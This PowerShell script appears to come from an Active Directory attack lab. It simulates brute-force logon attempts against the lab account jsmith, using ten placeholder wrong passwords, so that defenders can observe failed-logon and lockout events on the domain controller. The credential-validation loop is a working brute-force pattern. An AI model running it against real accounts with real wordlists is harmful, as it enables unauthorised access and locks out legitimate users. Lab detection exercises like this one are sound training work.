# brute_force_sim.ps1
# Simulates repeated failed logon attempts against a domain account.
# Run from BANK-WS01 as a domain user — does NOT require admin privileges.
#
# Lab: OakridgeBank AD Authentication Attack Lab
# Target: oakridgebank\jsmith
# Technique: T1110 - Brute Force

$domain = "oakridgebank.local"
$username = "jsmith"
$badPasswords = @(
    "wrongpass1", "wrongpass2", "wrongpass3",
    "wrongpass4", "wrongpass5", "wrongpass6",
    "wrongpass7", "wrongpass8", "wrongpass9", "wrongpass10"
)

Write-Host "[*] Starting brute force simulation against $username@$domain"
Write-Host "[*] $(Get-Date -Format 'HH:mm:ss') - Attack begins"

foreach ($pwd in $badPasswords) {
    $secPwd = ConvertTo-SecureString $pwd -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential("$domain\$username", $secPwd)

    try {
        $null = [System.DirectoryServices.AccountManagement.PrincipalContext]::new(
            [System.DirectoryServices.AccountManagement.ContextType]::Domain, $domain
        ).ValidateCredentials($username, $pwd)
    } catch {}

    Write-Host "[-] Failed attempt with password: $pwd at $(Get-Date -Format 'HH:mm:ss')"
    Start-Sleep -Milliseconds 500
}

Write-Host "[*] Simulation complete. Check BANK-DC01 Security event log for Event IDs 4625, 4771, and 4740."
